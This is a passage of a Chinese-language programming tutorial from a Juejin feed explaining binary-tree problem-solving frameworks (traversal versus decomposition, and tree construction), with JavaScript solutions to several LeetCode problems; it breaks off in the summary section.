<p>Python基础语法的坑，大多集中在细节上，新手只要多注意规范、多练习，就能快速避开。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[二叉树解题心法：从思维到实战，一文理解所有核心考点]]></title>    <link>https://juejin.cn/post/7602420156397142059</link>    <guid>https://juejin.cn/post/7602420156397142059</guid>    <pubDate>2026-02-03T10:20:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397142059" data-draft-id="7602488966609371174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="二叉树解题心法：从思维到实战，一文理解所有核心考点"/> <meta itemprop="keywords" content="JavaScript,后端,算法"/> <meta itemprop="datePublished" content="2026-02-03T10:20:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜酱"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            二叉树解题心法：从思维到实战，一文理解所有核心考点
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:20:35.000Z" title="Tue Feb 03 2026 10:20:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">二叉树解题心法：从思维到实战，一文理解所有核心考点</h2>
<p>二叉树是算法面试的<strong>核心基础考点</strong>，无论是遍历、构造、序列化还是子树相关问题，都有一套统一的解题框架和思维模式。本文将从<strong>解题总纲</strong>出发，依次讲解<strong>遍历与分解问题思维</strong>、<strong>二叉树构造</strong>、<strong>序列化与反序列化</strong>三大核心模块，结合LeetCode经典真题，从原理到代码实现层层拆解，让你形成一套可复用的二叉树解题体系，轻松应对各类二叉树问题。</p>
<h3 data-id="heading-1">一、二叉树解题总纲（纲领篇）</h3>
<p>所有二叉树问题的解题思维，都可以归为两类，且无论使用哪种思维，都要聚焦<strong>单个节点的操作</strong>和<strong>执行时机</strong>：</p>
<h4 data-id="heading-2">核心思维模式</h4>
<ol>
<li>
<p><strong>遍历思维</strong>：能否通过<strong>遍历一遍二叉树</strong>得到答案？若可以，编写<code>traverse</code>遍历函数，配合外部变量记录结果，让每个节点执行相同操作。</p>
</li>
<li>
<p><strong>分解问题思维</strong>：能否通过<strong>子问题（子树）的答案推导原问题答案</strong>？若可以，定义递归函数并明确其<strong>返回值含义</strong>，充分利用子树的返回值构建原问题解。</p>
</li>
</ol>
<h4 data-id="heading-3">核心思考步骤</h4>
<p>单独抽出一个二叉树节点，思考两个关键问题：</p>
<ol>
<li>
<p>这个节点<strong>需要做什么事情</strong>？（如交换左右子节点、计算子树高度、序列化子树等）</p>
</li>
<li>
<p>这件事需要在<strong>什么时候做</strong>？（前序/中序/后序位置，层序的当前层）</p>
</li>
</ol>
<p><strong>其他节点无需操心</strong>，递归函数会帮你在所有节点上执行相同的操作——这是二叉树递归解题的核心，也是「分治思想」的完美体现。</p>
<h3 data-id="heading-4">二、二叉树解题思维：遍历 vs 分解问题（思维篇）</h3>
<p>我们通过3道LeetCode经典简单题，实战区分两种思维模式的差异与适用场景，理解<strong>前/中/后序位置</strong>的核心作用。</p>
<h4 data-id="heading-5">题1：翻转二叉树（LeetCode 226）</h4>
<p><strong>题目要求</strong>：原地翻转二叉树，交换每个节点的左右子节点，返回翻转后的根节点。</p>
<p><strong>核心结论</strong>：前后序位置均可实现，遍历思维更直观，分解思维更贴合递归本质。</p>
<h5 data-id="heading-6">解法1：遍历思维（前序遍历）</h5>
<p>遍历每个节点，在<strong>前序位置</strong>直接交换当前节点的左右子节点，递归处理子节点即可。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 遍历思维：前序递归，直接操作每个节点
 * 核心：前序位置交换左右子节点，原地修改
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">invertTree</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-comment">// 前序位置：当前节点操作——交换左右子节点</span>
  [root.<span class="hljs-property">left</span>, root.<span class="hljs-property">right</span>] = [root.<span class="hljs-property">right</span>, root.<span class="hljs-property">left</span>];
  <span class="hljs-comment">// 递归遍历左右子树，完成下层翻转</span>
  <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">left</span>);
  <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">right</span>);
  <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h5 data-id="heading-7">解法2：分解问题思维</h5>
<p><strong>函数定义</strong>：<code>invertTree(root)</code> 表示「翻转以<code>root</code>为根的二叉树，返回翻转后的根节点」。</p>
<p>利用函数定义，先翻转左右子树，再交换当前节点的左右子节点，贴合「子问题推导原问题」的思路。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 分解问题思维：利用子树结果推导原问题
 * 核心：先解子问题（翻转左右子树），再处理当前节点
 */</span>
<span class="hljs-keyword">var</span> invertTree = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 子问题1：翻转左子树，得到翻转后的左子树根</span>
    <span class="hljs-keyword">var</span> left = <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">left</span>);
    <span class="hljs-comment">// 子问题2：翻转右子树，得到翻转后的右子树根</span>
    <span class="hljs-keyword">var</span> right = <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">right</span>);
    <span class="hljs-comment">// 处理当前节点：交换左右子节点</span>
    root.<span class="hljs-property">left</span> = right;
    root.<span class="hljs-property">right</span> = left;
    <span class="hljs-comment">// 符合函数定义：返回翻转后的当前根节点</span>
    <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h4 data-id="heading-8">题2：填充节点的右侧指针（LeetCode 116）</h4>
<p><strong>题目要求</strong>：完美二叉树中，将同一层相邻节点通过<code>next</code>指针连接，最右侧节点<code>next</code>为<code>null</code>，原地修改。</p>
<p><strong>核心结论</strong>：<strong>遍历思维更适用</strong>，需将「两个相邻节点」作为遍历单元（三叉树思维），中后序无法实现。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 遍历思维：自定义遍历单元（两个相邻节点）
 * 核心：前序位置连接相邻节点，递归处理下层所有相邻对
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> root;
  <span class="hljs-comment">// 从根节点的左右子节点开始，处理第一层相邻对</span>
  <span class="hljs-title function_">link</span>(root.<span class="hljs-property">left</span>, root.<span class="hljs-property">right</span>);
  <span class="hljs-keyword">return</span> root;

  <span class="hljs-comment">// 遍历单元：两个相邻节点，负责连接并处理下层</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">link</span>(<span class="hljs-params">node1, node2</span>) {
    <span class="hljs-keyword">if</span> (!node1 || !node2) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// 前序位置：核心操作——连接两个相邻节点</span>
    node1.<span class="hljs-property">next</span> = node2;
    <span class="hljs-comment">// 处理同父节点的左右子节点</span>
    <span class="hljs-title function_">link</span>(node1.<span class="hljs-property">left</span>, node1.<span class="hljs-property">right</span>);
    <span class="hljs-comment">// 处理跨父节点的相邻子节点（核心难点）</span>
    <span class="hljs-title function_">link</span>(node1.<span class="hljs-property">right</span>, node2.<span class="hljs-property">left</span>);
    <span class="hljs-comment">// 处理另一父节点的左右子节点</span>
    <span class="hljs-title function_">link</span>(node2.<span class="hljs-property">left</span>, node2.<span class="hljs-property">right</span>);
  }
}
</code></pre>
<h4 data-id="heading-9">题3：将二叉树展开为链表（LeetCode 114）</h4>
<p><strong>题目要求</strong>：原地将二叉树展开为单链表，按<strong>前序遍历顺序</strong>通过<code>right</code>指针连接，<code>left</code>指针置空。</p>
<p><strong>核心结论</strong>：<strong>分解问题思维更高效</strong>，后序位置利用子树展开结果，直接拼接即可；遍历思维需额外记录前序节点，实现复杂。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 分解问题思维：后序遍历，利用子树展开结果拼接
 * 函数定义：flatten(root) 表示「将root为根的树展开为前序链表」
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">flatten</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// 子问题1：展开左子树</span>
    <span class="hljs-title function_">flatten</span>(root.<span class="hljs-property">left</span>);
    <span class="hljs-comment">// 子问题2：展开右子树</span>
    <span class="hljs-title function_">flatten</span>(root.<span class="hljs-property">right</span>);

    <span class="hljs-comment">// 后序位置：利用子树结果处理当前节点（关键！后序能获取子树处理后的结果）</span>
    <span class="hljs-keyword">const</span> left = root.<span class="hljs-property">left</span>;  <span class="hljs-comment">// 已展开的左链表</span>
    <span class="hljs-keyword">const</span> right = root.<span class="hljs-property">right</span>; <span class="hljs-comment">// 已展开的右链表</span>

    <span class="hljs-comment">// 核心操作：将左链表拼接到root.right，左指针置空</span>
    root.<span class="hljs-property">left</span> = <span class="hljs-literal">null</span>;
    root.<span class="hljs-property">right</span> = left;

    <span class="hljs-comment">// 找到左链表的尾节点，拼接右链表</span>
    <span class="hljs-keyword">let</span> p = root;
    <span class="hljs-keyword">while</span> (p.<span class="hljs-property">right</span> !== <span class="hljs-literal">null</span>) p = p.<span class="hljs-property">right</span>;
    p.<span class="hljs-property">right</span> = right;
}
</code></pre>
<h4 data-id="heading-10">思维对比与前/后序核心作用</h4>




























<table><thead><tr><th>思维模式</th><th>核心特点</th><th>适用场景</th><th>关键位置</th></tr></thead><tbody><tr><td>遍历思维</td><td>直接操作节点，配合外部变量</td><td>无需子树结果，仅需遍历节点执行操作</td><td>前序（优先）、层序</td></tr><tr><td>分解问题思维</td><td>利用子树返回值，推导原问题</td><td>需基于子树处理结果完成当前节点操作</td><td>后序（优先）、前序</td></tr><tr><td><strong>前序 vs 后序核心区别</strong>：</td><td/><td/></tr></tbody></table>
<ul>
<li>
<p>前序位置：<strong>只能获取父节点传递的参数</strong>，无法获取子树的处理结果，适合「先操作当前节点，再递归子节点」；</p>
</li>
<li>
<p>后序位置：<strong>既能获取参数，又能获取子树的返回值</strong>，是「分解问题思维」的核心位置，几乎所有子树相关问题都需要在后序位置处理。</p>
</li>
</ul>
<h3 data-id="heading-11">三、二叉树构造问题：分解问题的极致应用（构造篇）</h3>
<p>二叉树的构造问题是<strong>分解问题思维</strong>的典型场景，核心框架为：</p>
<p><strong>构造整棵树 = 构建根节点 + 递归构造左子树 + 递归构造右子树</strong></p>
<p>所有构造问题的解题步骤可总结为<strong>四步通用框架</strong>：</p>
<ol>
<li>
<p><strong>定根</strong>：确定当前子树的根节点（如最大值、前序首元素、后序尾元素）；</p>
</li>
<li>
<p><strong>找边界</strong>：根据根节点，划分左/右子树的元素边界（如数组区间、遍历序列索引）；</p>
</li>
<li>
<p><strong>算大小</strong>：计算左/右子树的节点个数，作为分割遍历序列的依据；</p>
</li>
<li>
<p><strong>分治构建</strong>：递归构建左/右子树，挂载到当前根节点的左右指针。</p>
</li>
</ol>
<p>下面结合4道LeetCode经典构造题，从简单到复杂，吃透构造问题的通用解法。</p>
<h4 data-id="heading-12">题1：最大二叉树（LeetCode 654）</h4>
<p><strong>题目要求</strong>：给定无重复整数数组，构建最大二叉树——根为数组最大值，左子树用最大值左区间构建，右子树用最大值右区间构建。</p>
<p><strong>核心思路</strong>：<strong>数组索引分治</strong>，全程操作原数组，无数组拷贝，空间效率最优。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 最大二叉树构造：数组区间分治，分解问题思维
 * 核心：找区间最大值定根，分割区间递归构建左右子树
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">constructMaximumBinaryTree</span>(<span class="hljs-params">nums</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);

  <span class="hljs-comment">// 函数定义：用nums[low..high]构建最大二叉树，返回根节点</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">nums, low, high</span>) {
    <span class="hljs-keyword">if</span> (low &gt; high) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 区间无效，返回null</span>

    <span class="hljs-comment">// 步骤1：找区间最大值及索引（定根）</span>
    <span class="hljs-keyword">let</span> maxVal = -<span class="hljs-title class_">Infinity</span>, maxIdx = -<span class="hljs-number">1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = low; i &lt;= high; i++) {
      <span class="hljs-keyword">if</span> (nums[i] &gt; maxVal) {
        maxVal = nums[i];
        maxIdx = i;
      }
    }

    <span class="hljs-comment">// 步骤2：构建当前根节点</span>
    <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(maxVal);
    <span class="hljs-comment">// 步骤3：分治构建左右子树（找边界）</span>
    root.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(nums, low, maxIdx - <span class="hljs-number">1</span>);
    root.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(nums, maxIdx + <span class="hljs-number">1</span>, high);

    <span class="hljs-keyword">return</span> root;
  }
}
</code></pre>
<h4 data-id="heading-13">题2：从前序与中序遍历序列构造二叉树（LeetCode 105）</h4>
<p><strong>题目要求</strong>：给定二叉树的前序和中序遍历序列，构造并返回二叉树（节点值无重复）。</p>
<p><strong>核心特性</strong>：</p>
<ol>
<li>
<p>前序：<strong>根 → 左子树 → 右子树</strong>（首元素为根）；</p>
</li>
<li>
<p>中序：<strong>左子树 → 根 → 右子树</strong>（根为分割点，划分左右子树）；</p>
</li>
<li>
<p>关键桥梁：中序中左子树的节点个数，是分割前序序列的唯一依据。</p>
</li>
</ol>
<p><strong>性能优化</strong>：构建中序「值→索引」Map，将根节点查询时间从O(n)降至O(1)，时间复杂度从O(n²)优化为O(n)。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 前序+中序构造二叉树：索引分治+Map优化
 * 核心：前序定根，中序分左右，节点数做桥梁
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildTree</span>(<span class="hljs-params">preorder, inorder</span>) {
  <span class="hljs-keyword">if</span> (preorder.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-comment">// 构建中序值→索引Map，O(1)查询根节点位置</span>
  <span class="hljs-keyword">const</span> valToIndex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  inorder.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">val, idx</span>) =&gt;</span> valToIndex.<span class="hljs-title function_">set</span>(val, idx));
  <span class="hljs-comment">// 初始区间：全数组[0, len-1]</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>(<span class="hljs-number">0</span>, preorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, inorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);

  <span class="hljs-comment">// 函数定义：用pre[pStart..pEnd]和in[iStart..iEnd]构建子树</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">pStart, pEnd, iStart, iEnd</span>) {
    <span class="hljs-keyword">if</span> (pStart &gt; pEnd) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 步骤1：前序首元素为根（定根）</span>
    <span class="hljs-keyword">const</span> rootVal = preorder[pStart];
    <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(rootVal);
    <span class="hljs-comment">// 步骤2：中序中找根节点索引（找边界）</span>
    <span class="hljs-keyword">const</span> rootInIdx = valToIndex.<span class="hljs-title function_">get</span>(rootVal);
    <span class="hljs-comment">// 步骤3：计算左子树节点数（做桥梁）</span>
    <span class="hljs-keyword">const</span> leftSize = rootInIdx - iStart;

    <span class="hljs-comment">// 步骤4：分治构建左右子树</span>
    root.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(pStart + <span class="hljs-number">1</span>, pStart + leftSize, iStart, rootInIdx - <span class="hljs-number">1</span>);
    root.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(pStart + leftSize + <span class="hljs-number">1</span>, pEnd, rootInIdx + <span class="hljs-number">1</span>, iEnd);
    <span class="hljs-keyword">return</span> root;
  }
}
</code></pre>
<h4 data-id="heading-14">题3：从中序与后序遍历序列构造二叉树（LeetCode 106）</h4>
<p><strong>题目要求</strong>：给定二叉树的中序和后序遍历序列，构造并返回二叉树（节点值无重复）。</p>
<p><strong>核心特性</strong>（与前序+中序的唯一区别）：</p>
<ul>
<li>
<p>后序：<strong>左子树 → 右子树 → 根</strong>（尾元素为根）；</p>
</li>
<li>
<p>后序序列分割时，需<strong>排除尾节点的根</strong>，右区间结束位置为<code>pEnd - 1</code>。</p>
</li>
</ul>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 中序+后序构造二叉树：索引分治+Map优化
 * 核心：后序定根（尾元素），中序分左右，节点数做桥梁
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildTree</span>(<span class="hljs-params">inorder, postorder</span>) {
  <span class="hljs-keyword">if</span> (postorder.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">const</span> valToIndex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  inorder.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">val, idx</span>) =&gt;</span> valToIndex.<span class="hljs-title function_">set</span>(val, idx));
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>(<span class="hljs-number">0</span>, postorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, inorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">pStart, pEnd, iStart, iEnd</span>) {
    <span class="hljs-keyword">if</span> (pStart &gt; pEnd) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 步骤1：后序尾元素为根（定根，与前序的核心区别）</span>
    <span class="hljs-keyword">const</span> rootVal = postorder[pEnd];
    <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(rootVal);
    <span class="hljs-keyword">const</span> rootInIdx = valToIndex.<span class="hljs-title function_">get</span>(rootVal);
    <span class="hljs-keyword">const</span> leftSize = rootInIdx - iStart;

    <span class="hljs-comment">// 步骤2：分治构建左右子树（后序区间分割与前序不同）</span>
    root.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(pStart, pStart + leftSize - <span class="hljs-number">1</span>, iStart, rootInIdx - <span class="hljs-number">1</span>);
    root.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(pStart + leftSize, pEnd - <span class="hljs-number">1</span>, rootInIdx + <span class="hljs-number">1</span>, iEnd);
    <span class="hljs-keyword">return</span> root;
  }
}
</code></pre>
<h4 data-id="heading-15">题4：从前序与后序遍历序列构造二叉树（LeetCode 889）</h4>
<p><strong>题目要求</strong>：给定二叉树的前序和后序遍历序列，构造并返回二叉树（节点值无重复，答案不唯一）。</p>
<p><strong>核心特性</strong>（与前两题的关键区别）：</p>
<ol>
<li>
<p>前序+后序<strong>无法唯一确定二叉树</strong>（根节点加单个子节点，左/右均可），题目允许返回任意合法答案；</p>
</li>
<li>
<p>前序第二个元素为<strong>左子树的根</strong>，通过后序找到其位置，计算左子树大小（分割序列的依据）；</p>
</li>
<li>
<p>递归终止时需单独处理<strong>叶子节点</strong>（避免数组越界）。</p>
</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 前序+后序构造二叉树：索引分治+叶子节点单独处理
 * 核心：前序定根，后序定左子树边界，答案不唯一
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">constructFromPrePost</span>(<span class="hljs-params">preorder, postorder</span>) {
  <span class="hljs-keyword">if</span> (preorder.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-comment">// 构建后序值→索引Map</span>
  <span class="hljs-keyword">const</span> valToIndex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  postorder.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">val, idx</span>) =&gt;</span> valToIndex.<span class="hljs-title function_">set</span>(val, idx));
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>(<span class="hljs-number">0</span>, preorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, postorder.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">pStart, pEnd, postStart, postEnd</span>) {
    <span class="hljs-keyword">if</span> (pStart &gt; pEnd) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 单独处理叶子节点（避免preStart+1越界，关键！）</span>
    <span class="hljs-keyword">if</span> (pStart === pEnd) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(preorder[pStart]);

    <span class="hljs-comment">// 步骤1：前序首元素为根</span>
    <span class="hljs-keyword">const</span> rootVal = preorder[pStart];
    <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(rootVal);
    <span class="hljs-comment">// 步骤2：前序第二个元素为左子树根，找其在后序的位置</span>
    <span class="hljs-keyword">const</span> leftRootVal = preorder[pStart + <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> leftPostIdx = valToIndex.<span class="hljs-title function_">get</span>(leftRootVal);
    <span class="hljs-comment">// 步骤3：计算左子树节点数</span>
    <span class="hljs-keyword">const</span> leftSize = leftPostIdx - postStart + <span class="hljs-number">1</span>;

    <span class="hljs-comment">// 步骤4：分治构建左右子树</span>
    root.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(pStart + <span class="hljs-number">1</span>, pStart + leftSize, postStart, leftPostIdx);
    root.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(pStart + leftSize + <span class="hljs-number">1</span>, pEnd, leftPostIdx + <span class="hljs-number">1</span>, postEnd - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> root;
  }
}
</code></pre>
<h4 data-id="heading-16">构造问题通用总结</h4>
<ol>
<li>
<p><strong>必用分解问题思维</strong>：构造整棵树的本质是递归构造子树，必须定义「区间构建子树」的递归函数；</p>
</li>
<li>
